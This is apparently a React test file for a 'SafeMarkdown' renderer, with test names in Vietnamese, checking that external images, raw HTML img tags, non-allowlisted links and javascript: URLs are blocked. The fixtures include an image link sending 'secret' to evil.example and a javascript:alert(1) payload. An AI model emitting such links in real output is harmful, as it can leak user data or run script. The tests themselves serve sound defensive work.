import { render } from "@testing-library/react";
import { describe, expect, it } from "vitest";
import { SafeMarkdown } from "./markdown";

describe("SafeMarkdown", () => {
  it("ảnh ngoài không render <img>", () => {
    const { container } = render(<SafeMarkdown text="![x](https://evil.example/leak?q=secret)" />);
    expect(container.querySelector("img")).toBeNull();
    expect(container.innerHTML).not.toContain("<img");
    expect(container.textContent).toContain("Ảnh bị chặn");
  });
  it("HTML img thô không thành phần tử", () => {
    const { container } = render(<SafeMarkdown text={'<img src="https://evil.example/a.png">'} />);
    expect(container.querySelector("img")).toBeNull();
  });
  it("link ngoài allowlist không bấm được; link allowlist thì có", () => {
    const { container } = render(
      <SafeMarkdown text="[a](https://evil.example/x) [b](https://ok.example/y)" linkHosts={["ok.example"]} />,
    );
    const links = container.querySelectorAll("a");
    expect(links).toHaveLength(1);
    expect(links[0]?.getAttribute("href")).toBe("https://ok.example/y");
  });
  it("javascript: bị chặn", () => {
    const { container } = render(<SafeMarkdown text="[x](javascript:alert(1))" />);
    expect(container.querySelector("a")).toBeNull();
  });
});
